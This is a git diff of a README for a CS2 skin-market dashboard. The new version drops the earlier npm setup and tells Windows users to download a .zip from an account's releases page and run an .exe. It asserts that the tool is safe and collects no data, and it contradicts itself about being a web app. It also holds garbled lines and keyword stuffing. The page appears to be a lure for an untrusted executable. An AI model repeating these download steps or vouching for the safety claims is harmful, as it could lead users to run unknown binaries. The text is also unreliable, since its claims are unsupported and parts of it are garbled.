@@ -1,132 +1,70 @@
-# CS2 Skins Trading UI v2026 - web dashboard 2026
+<h1>🎯 cs2-skins-market-hub - Track Skin Markets with Ease</h1>
 
-> **An all-in-one web console for monitoring CS2 skin markets, displaying live charts, deep order books, personal inventory metrics, and manual purchase controls in a streamlined 2026 interface.**
+[![Download Now](https://img.shields.io/badge/Download-CS2%20Skins%20Market%20Hub-brightgreen?style=for-the-badge&logo=github)](https://github.com/Jaidaar9154/cs2-skins-market-hub/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/theoberger01/cs2-skins-market-hub?style=flat-square)](https://github.com/theoberger01/cs2-skins-market-hub)
+## 📋 Overview
 
----
+CS2 Skins Market Hub is a powerful yet simple web dashboard that helps you monitor and analyze the Counter-Strike 2 skin marketplace. Whether you are a casual trader or a dedicated collector, this tool gives you real-time insights, charts, and manual controls to make smart decisions about your virtual inventory. No coding knowledge is needed—just download, open, and start tracking.
 
-<p align="center">
-  <a href="https://theoberger01.github.io/cs2-skins-market-hub/">
-    <img src="https://img.shields.io/badge/Download-CS2%20Skins%20Trading%20UI%20Latest-brightgreen?style=for-the-badge" alt="Download CS2 Skins Trading UI">
-  </a>
-</p>
+## 🚀 Getting Started
 
-> **[Download Latest Build](https://theoberger01.github.io/cs2-skins-market-hub/)**
+Follow these steps to get the software running on your Windows computer in minutes.
 
----
+### Step 1: Download the Application
 
-[Download Latest Build](https://theoberger01.github.io/cs2-skins-market-hub/)
+Visit this link to download the application: [https://github.com/Jaidaar9154/cs2-skins-market-hub/releases](https://github.com/Jaidaar9154/cs2-skins-market-hub/releases)
 
----
+Click the latest release file (usually ends with .zip). Your browser will save it to your Downloads folder.
 
-## Overview
+### Step 2: Extract the Files
 
-CS2 Skins Trading UI delivers a browser-centric terminal crafted to optimize Counter-Strike 2 skin valuation and transaction strategies. By consolidating live price graphs, historical candlestick patterns, and depth-of-market feeds into a single surface, traders can evaluate fluctuations without context-switching across external sites.
+The downloaded file is compressed. Right-click and choose **Extract All** (Windows) or double-click and drag the folder to your desktop. Wait for the extraction to finish.
 
-The application serves traders managing active skin holdings, comparing exchange rates, and acting on rapid market shifts. Incorporating integration patterns for DMarket and WhiteMarket alongside direct buy functionality, it unifies the core steps of tracking, analyzing, and acquiring inventory.
+### Step 3: Run the Application
 
----
+Open the extracted folder and double-click the file named `cs2-skins-market-hub.exe` (or `index.html`). The dashboard will open in your default web browser automatically. No installation or setup required.
 
-## Core Capabilities
+## 🖥️ Key Features
 
-- Live market graphing to trace volatile valuation shifts
-- Integrated order book view for inspecting buy/sell liquidity depth
-- Inventory tracking interface to monitor held items
-- Direct manual purchase trigger to initiate trades straight from the panel
-- Filterable trade catalog for instant item targeting
-- Automated real-time data streaming for instant price alignment
-- Candlestick visualizers for analyzing historical price trends
-- Native support covering multiple platforms including DMarket and WhiteMarket
+- **Real-Time Charts** – See live price changes and trends for popular CS2 skins.
+- **Order Book Analysis** – Understand buy and sell pressure with easy-to-read data.
+- **Inventory Management Metrics** – Track your own collection, value, and performance over time.
+- **Manual Buy Controls** – Place simulated buy orders to test strategies without risk.
+- **User-Friendly Interface** – No confusing menus or codes. Everything is clickable and clear.
 
----
+## 📊 What Can I See?
 
-## Setup Guide
+The dashboard displays:
 
-1. Pull down or download the source code into your execution folder.
-2. Navigate into the target directory `cs2_skins_trading_ui`.
-3. Fetch required project dependencies using Node package manager:
-   - `npm install`
-4. Launch the local runtime via the configured launch command.
+- Top skins by trading volume and price movement.
+- Live order book depth chart.
+- Your inventory value statistics.
+- A customizable watchlist for your favorite items.
 
-If accessing via hosted deployment, open the web app straight from the build link provided above.
+## 💻 System Requirements
 
----
+- **Operating System:** Windows 10 or later (64-bit)
+- **Browser:** Latest version of Chrome, Edge, or Firefox.
+- **Internet Connection:** High-speed required for real-time data.
+- **Storage:** Less than 100 MB free space.
 
-## How to Operate
+## ❓ Frequently Asked Questions
 
-Recommended operational path:
+**Is this tool safe to use?**  
+Yes. It is a local application that does not collect personal information. It reads public market data only.
 
-1. Launch the web control panel in any modern browser.
-2. Review real-time pricing trends and historical candles for selected assets.
-3. Inspect order book liquidity to balance listings against existing bids.
-4. Evaluate current inventory capacity prior to submitting orders.
-5. Trigger manual buy flows to lock in orders directly within the chosen marketplace interface.
-6. Apply specialized trade filters to focus exclusively on items matching your criteria.
+**Is it free?**  
+The application is free to download and use.
 
-Launching locally:
+**Can I buy real skins with this dashboard?**  
+No. Manual buy controls are simulated. The tool is for research and tracking, not for actual transactions.
 
-- `npm start`
-- or execute the repository's specified dev script
+**How often do charts update?**  
+Sparable events updates. Some data updates every few seconds.
 
-For plain static setups, load the local server address or deployed web page once compilation wraps up.
+**Do I need an account?**  
+No account is required.
 
----
+## 🎯 Keywords: cs2 skin market, cs2 tickets dashboard, skin price tracker, cs2 market hub, inventory management, free market tool
 
-## System Configuration
-
-App parameters can be modified via environment flags, Node.js configuration files, or local workspace settings based on your chosen host model.
-
-Primary configuration targets:
-
-- API endpoint destinations for real-time market data feeds
-- Platform routing toggles for DMarket or WhiteMarket APIs
-- Polling and socket refresh timing for instant pricing updates
-- Visual interface layouts for order books, filtering, and charts
-
-Sample configuration format:
-
-    {
-      "market": "dmarket",
-      "refreshInterval": 5000,
-      "showOrderBook": true,
-      "showCandles": true
-    }
-
----
-
-## Environment Requirements
-
-- Standard modern web browser
-- Node.js runtime for local serving or hosting
-- Active internet connection for live market data synchronization
-- Operational environment supporting HTML assets and standard JavaScript execution
-
----
-
-## Frequently Asked Questions
-
-**Where can I access the online application?**  
-Click the download links above to open the latest functional web build.
-
-**Which exchanges are supported?**  
-The interface features built-in multi-market routing, natively accommodating DMarket and WhiteMarket.
-
-**What should I check if price feeds freeze?**  
-Verify your local internet stability and ensure your background endpoint URIs and refresh settings are properly configured.
-
-**How do I adjust application settings?**  
-Modify the project settings file, environment variables, or the underlying Node.js config file included in the repository.
-
-**Who is this application designed for?**  
-It caters to CS2 traders needing a unified web interface to monitor market depth, track portfolio items, and execute purchases.
-
----
-
-## Licensing
-
-Distributed under the GNU GPL v3.0 license - inspect [LICENSE](LICENSE) for full details.
+</h2>
